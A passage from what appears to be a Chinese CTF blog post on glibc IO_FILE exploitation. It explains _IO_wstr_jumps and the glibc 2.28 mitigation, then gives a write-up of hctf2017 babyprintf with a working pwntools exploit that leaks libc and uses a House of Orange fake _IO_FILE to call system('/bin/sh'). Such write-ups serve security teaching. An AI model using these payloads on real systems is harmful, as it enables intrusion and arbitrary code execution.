<h3 id="IO-wstr-jumps"><a href="#IO-wstr-jumps" class="headerlink" title="_IO_wstr_jumps"></a>_IO_wstr_jumps</h3><p>其用法和<code>_IO_str_jumps</code> 相似，<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理 <code>wchar</code>的。其定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_wstr_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_wstr_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, (_IO_overflow_t) _IO_wstr_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_default_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_default_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_default_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_default_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_default_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_default_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>_IO_wstr_overflow</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_wint_t</span><br><span class="line">_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == WEOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : WEOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> WEOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">wchar_t</span> *new_buf;</span><br><span class="line">	  <span class="type">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">	  _IO_size_t new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">	      || __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">	  new_buf = (<span class="type">wchar_t</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size * <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> WEOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      __wmemcpy (new_buf, old_buf, old_wblen);</span><br><span class="line">	      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  __wmemset (new_buf + old_wblen, <span class="string">L&#x27;\0&#x27;</span>, new_size - old_wblen);</span><br><span class="line"></span><br><span class="line">	  _IO_wsetb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_base =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_end =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_ptr =</span><br><span class="line">	    new_buf + (fp-&gt;_wide_data-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_wide_data-&gt;_IO_write_ptr++ = c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>_IO_wstr_finish</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wstr_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="glibc-2-28-防御措施"><a href="#glibc-2-28-防御措施" class="headerlink" title="glibc-2.28 防御措施"></a>glibc-2.28 防御措施</h3><p>在 <code>glibc-2.28</code> 版本中，用操作堆的 <code>malloc</code> 函数和 <code>free</code> 函 数 替 换 原 来 在 <code>_IO_str_fields</code> 里 的 <code>_allocate_buffer</code> 和 <code>_free_buffer</code> 。 由 于 不 再 使 用 偏 移 ， 也 就 不 能 利 用 <code>__libc_IO_vtables</code> 上的 <code>vtable</code> 绕过检查，于是新的 <code>FOSP</code> 利用技术 就失效了。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wstr_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_wdefault_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">	...</span><br><span class="line">  	pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">			<span class="keyword">return</span> EOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">char</span> *new_buf;</span><br><span class="line">	  		<span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  		<span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  		<span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  		<span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    		<span class="keyword">return</span> EOF;</span><br><span class="line">            </span><br><span class="line">	  		new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wstr_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  	<span class="type">int</span> flush_only = c == WEOF;</span><br><span class="line">	...</span><br><span class="line">  	pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_wblen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">			<span class="keyword">return</span> WEOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">wchar_t</span> *new_buf;</span><br><span class="line">	  		<span class="type">wchar_t</span> *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	  		<span class="type">size_t</span> old_wblen = _IO_wblen (fp);</span><br><span class="line">	  		<span class="type">size_t</span> new_size = <span class="number">2</span> * old_wblen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	  	<span class="keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)</span><br><span class="line">	      	|| __glibc_unlikely (new_size &gt; SIZE_MAX / <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>)))</span><br><span class="line">	    	<span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">	  	new_buf = <span class="built_in">malloc</span> (new_size * <span class="built_in">sizeof</span> (<span class="type">wchar_t</span>));</span><br><span class="line">	...</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure></div>

<h2 id="hctf2017-babyprintf"><a href="#hctf2017-babyprintf" class="headerlink" title="[hctf2017]babyprintf"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.25_pwn_hctf2017_babyprintf" >[hctf2017]babyprintf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查信息"><a href="#检查信息" class="headerlink" title="检查信息"></a>检查信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173157389.png"
                      alt="image-20231022173157389"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173259777.png"
                      alt="image-20231022173259777"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022172848195.png"
                      alt="image-20231022172848195"
                ></p>
<p>开了 <code>NX</code> 和 <code>Canary</code>，题目 <code>libc</code> 为 <code>2.24</code> 版本。</p>
<h3 id="试运行-1"><a href="#试运行-1" class="headerlink" title="试运行"></a>试运行</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022173559457.png"
                      alt="image-20231022173559457"
                ></p>
<h3 id="逆向分析-2"><a href="#逆向分析-2" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v4 = <span class="built_in">read_n</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0x1000</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;string: &quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(v3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;result: &quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;too long&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">read_n</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="type">int</span>)v0;</span><br><span class="line">    v2 = _IO_getc(stdin);</span><br><span class="line">    v4[v0] = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[<span class="number">9</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">strtoul</span>(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">      v1 = <span class="number">9LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strtoul</span>(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于程序开启了 <code>FORTIFY</code> 机制， 因此在程序编译时所有的 <code>printf()</code> 都被 <code>__printf_chk()</code> 替换掉了，它有如下限制：</p>
<blockquote>
<ul>
<li>包含 <code>%n</code> 的格式化字符串不能位于程序内存中的可写地址。</li>
<li>当使用位置参数时，必须使用范围内的所有参数。所以如果要使用 <code>%7$p</code>，你必须同时使用<code>1</code>,<code>2</code>,<code>3</code>,<code>4</code>,<code>5</code>和<code>6</code>。</li>
</ul>
</blockquote>
<p>先分配 <code>size</code> 大小的空间（不超过0x1000），然后在这里读入字符串，由于使用的是 <code>gets()</code> 函数，存在堆溢出漏洞。然后直接调用<code>__printf_chk()</code> 打印这个字符串，存在栈信息泄露漏洞。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./babyprintf&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.130&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    elf = ELF(<span class="string">&quot;./babyprintf&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prf</span>(<span class="params">size, string</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;string: &quot;</span>, string)</span><br></pre></td></tr></table></figure></div>

<p><strong>泄露libc</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfe1</span>)              <span class="comment"># top chunk header</span></span><br><span class="line">    prf(<span class="number">16</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io, &#x27;b *0x400810&#x27;)</span></span><br><span class="line">    prf(<span class="number">0x1000</span>, <span class="string">b&#x27;%p%p%p%p%p%pA&#x27;</span>)                <span class="comment"># _int_free in sysmalloc</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    libc_start_main = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;A&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">12</span>:], <span class="number">16</span>) - <span class="number">241</span></span><br><span class="line">    libc_base = libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc_base address: 0x%x&quot;</span> % libc_base)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164753642.png"
                      alt="image-20231023164753642"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164832351.png"
                      alt="image-20231023164832351"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164859904.png"
                      alt="image-20231023164859904"
                ></p>
<p>通过溢出将 <code>top_chunk</code> 的 <code>size</code> 改成 <code>fe1</code>，然后利用申请 <code>0x1000 &gt; 0xfe1</code> 大小的 <code>chunk</code> 将 <code>old_top_chunk</code> 放进 <code>unsorted bin</code> 中，并利用第二次的格式化字符串漏洞泄露 <code>libc</code> 地址。</p>
<p><strong>house of orange</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_orange</span>():</span><br><span class="line">    io_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    vtable_addr = libc_base + <span class="number">0x3BE4C0</span>          <span class="comment"># _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;_IO_list_all address: 0x%x&quot;</span> % io_list_all)</span><br><span class="line">    log.info(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % bin_sh_addr)</span><br><span class="line">    log.info(<span class="string">&quot;vtable address: 0x%x&quot;</span> % vtable_addr)</span><br><span class="line"></span><br><span class="line">    _IO_buf_end = (bin_sh_addr - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line">    stream  = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)                <span class="comment"># fake header, fp-&gt;_flags, fp-&gt;_IO_read_ptr</span></span><br><span class="line">    stream += p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)  <span class="comment"># fake bk pointer, fp-&gt;_IO_read_end, fp-&gt;_IO_read_base</span></span><br><span class="line">    stream += p64(<span class="number">0</span>)                            <span class="comment"># fp-&gt;_IO_write_base</span></span><br><span class="line">    stream += p64(<span class="number">0xffffffffffffffff</span>)           <span class="comment"># fp-&gt;_IO_write_ptr</span></span><br><span class="line">    stream += p64(<span class="number">0</span>) * <span class="number">2</span>                        <span class="comment"># fp-&gt;_IO_write_end, fp-&gt;_IO_buf_base</span></span><br><span class="line">    stream += p64(_IO_buf_end)                  <span class="comment"># fp-&gt;_IO_buf_end</span></span><br><span class="line">    stream  = stream.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    stream += p64(<span class="number">0</span>)                            <span class="comment"># fp-&gt;_mode</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += stream</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload += p64(vtable_addr)                 <span class="comment"># _IO_FILE_plus-&gt;vtable # 0xd8</span></span><br><span class="line">    payload += p64(system_addr)                 <span class="comment"># 0xe0</span></span><br><span class="line">    gdb.attach(io, <span class="string">&#x27;b *0x400810&#x27;</span>)</span><br><span class="line">    prf(<span class="number">16</span>, payload)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0x1000&quot;</span>)        <span class="comment"># abort routine</span></span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure></div>

<p>利用堆溢出漏洞构造如下 <code>Heap</code> 与 <code>IO_FILE</code> 结构:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/babyprintf.png"
                      alt="babyprintf"
                ></p>
<p>我们需要利用 <code>abort</code> 调用 <code>_IO_OVERFLOW</code> 所以需要 <code>fp-&gt;_mode</code>为 <code>0</code> 且 <code>fp-&gt;_IO_write_ptr&gt;_fp-&gt;_IO_write_base</code>。然后利用 <code>_IO_str_overflow</code> 函数所以需要绕过以下检查。</p>
<ul>
<li><code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) // 2</code></li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>_IO_write_ptr = ((bin_sh_addr - 100) // 2) +1</code> ,  <code>_IO_write_base = 0x0</code></li>
<li><code>fp-&gt;_s._allocate_buffer(fp+0xe0)</code> 改为 <code>system</code> 或 <code>one_gadget</code> 地址。</li>
</ul>
